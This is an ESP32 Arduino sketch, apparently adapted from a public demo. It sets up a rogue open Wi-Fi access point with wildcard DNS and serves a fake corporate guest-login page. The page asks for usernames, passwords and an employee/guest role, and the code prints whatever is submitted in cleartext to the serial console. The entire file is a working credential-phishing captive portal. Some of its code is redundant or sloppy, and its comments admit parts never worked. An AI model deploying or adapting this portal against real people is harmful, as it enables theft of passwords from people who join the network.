/* 
Origional example code used:
https://github.com/bdash9/ESP32-CaptivePortal/blob/main/ESP32_Captive_Portal_DEMO.ino

Modified by Anirudh
*/

#include <WiFi.h>
#include <AsyncTCP.h>
#include "ESPAsyncWebServer.h"
#include <DNSServer.h>


const char* ssid = "XXXXXX";
const char* password = "XXXXXXXXXXXX";

DNSServer dnsServer;
AsyncWebServer server(80);

String user_name;
String proficiency;
String user_password;
bool name_received = false;
bool proficiency_received = false;
bool password_received = false;

const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE HTML><html><head>
  <title>Dash9Computing Guest WiFi</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">  
  </head><body>
  <b><font color="blue">Dash</font><font color="red">9</font><font color="green">Computing</font> Guest WiFi</font></b>
  <br><h3>Please login with your TOP SECRET credentials!</h3><br>
  <form action="/get" method="POST">
    Username: <input type="text" name="user_name">
    <br>
    <br>
    Password: <input type="password" name="password">
    <br>
    Register as: 
   <select name="proficiency">
     <option value="Guest" selected>Guest</option>
     <option value="Employee">Employee</option>
   </select>

    <input type="submit" value="Submit">
  </form>
</body></html>)rawliteral";

class CaptivePortalHandler : public AsyncWebHandler {
public:
  CaptivePortalHandler() {}
  virtual ~CaptivePortalHandler() {}

  bool canHandle(AsyncWebServerRequest *request){
    // Intercept all HTTP requests
    //return true;
    return request->url() == "/";
  }

// I could never get this to print in the Serial monitor or the TFT
void handleRequest(AsyncWebServerRequest *request) {
  // Debugging statement
  Serial.println("Handle request called");

 if (request->method() == HTTP_POST && request->url() == "/get") {
  // Debugging statement
  Serial.println("Handling /get endpoint");

  if (request->hasParam("user_name", true)) {
    user_name = request->getParam("user_name", true)->value();
    name_received = true;
  }
  if (request->hasParam("password", true)) {
    user_password = request->getParam("password", true)->value();
    password_received = true;
  }

  if (request->hasParam("proficiency", true)) {
    proficiency = request->getParam("proficiency", true)->value();
    proficiency_received = true;
  }

  if (name_received && password_received && proficiency_received) {

    Serial.print("Username: ");
    Serial.println(user_name);
    Serial.print("Password: ");
    Serial.println(user_password);
    Serial.print("Proficiency: ");
    Serial.println(proficiency);

    name_received = false;
    password_received = false;
    proficiency_received = false;
  }
  // Debugging statement
  Serial.println("Handling /get endpoint");
  request->send(200, "text/html", index_html);

} else if (request->method() == HTTP_GET && request->url() == "/") {
  // Handle GET requests to "/" endpoint
  // Debugging statement
  Serial.println("Handling / endpoint");
  request->send(200, "text/html", index_html);
} else {
  // Redirect all other requests to the web page
  request->send(200, "text/html", index_html);
  }
}

};

void setupServer(){
  // Add captive portal handler to intercept HTTP requests
  server.addHandler(new CaptivePortalHandler()).setFilter(ON_AP_FILTER);

  server.onNotFound([](AsyncWebServerRequest *request){
    request->send_P(200, "text/html", index_html); 
  });

  // Add other handlers for your web server
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send_P(200, "text/html", index_html); 
    Serial.println(" User logging in:");
  });
  
server.on("/get", HTTP_POST, [](AsyncWebServerRequest *request){
  request->send(200, "text/plain", "OK");
}, [](AsyncWebServerRequest *request, const String& filename, size_t index, uint8_t *data, size_t len, bool final){
  if (request->url() == "/get") {
    String body = (const char*)data;
    if (body.indexOf("username=") != -1) {
      user_name = body.substring(body.indexOf("username=") + 9, body.indexOf("&"));
      Serial.println("Received username: " + user_name);
      name_received = true;
    }
    if (body.indexOf("password=") != -1) {
      user_password = body.substring(body.indexOf("password=") + 9, body.lastIndexOf("&"));
      Serial.println("Received password: " + user_password);
      password_received = true;
    }
    if (body.indexOf("proficiency=") != -1) {
      proficiency = body.substring(body.indexOf("proficiency=") + 12);
      Serial.println("Received proficiency: " + proficiency);
      proficiency_received = true;
    }
    // Debugging statement
    Serial.println("Handling /get endpoint");
  }
});

}

void setup(){
  Serial.begin(115200);

  // Connect to WiFi
  Serial.print("Connecting to ");
  Serial.println(ssid);
  WiFi.begin(ssid, password);
  dnsServer.start(53, "*", WiFi.softAPIP());
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");
  }
  Serial.println(WiFi.localIP());  
  Serial.println("");
  Serial.println("WiFi connected");
  delay(3000);
  Serial.println("Setting up AP Mode");
  Serial.println("");
  WiFi.mode(WIFI_AP); 
  WiFi.softAP("D9C Guest WiFi");
  Serial.println("AP IP address: ");
  Serial.println(WiFi.softAPIP());
  Serial.println("Setting up Async WebServer");
  setupServer();
  Serial.println("Starting DNS Server");
  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.setTTL(300);
  dnsServer.start(53, "*", WiFi.softAPIP());
  server.onNotFound([&](AsyncWebServerRequest *request){
        return true;
  });
  server.addHandler(new CaptivePortalHandler()).setFilter(ON_AP_FILTER);//only when requested from AP
  //more handlers...
  server.begin();
  Serial.println("All Done!");  

  Serial.println("Started Captive Portal...");
  
  setupServer(); // Add this line to initialize the web server

}

void loop(){
  // No conditional statement needed here
  // Just call dnsServer.processNextRequest() without expecting a return value
  dnsServer.processNextRequest();
  if(name_received && password_received && proficiency_received){
      Serial.println(user_name);
      Serial.println(user_password);
      Serial.println(proficiency);
      name_received = false;
      password_received = false;
      proficiency_received = false;
      Serial.println("We'll wait for the next client now");
    }
}
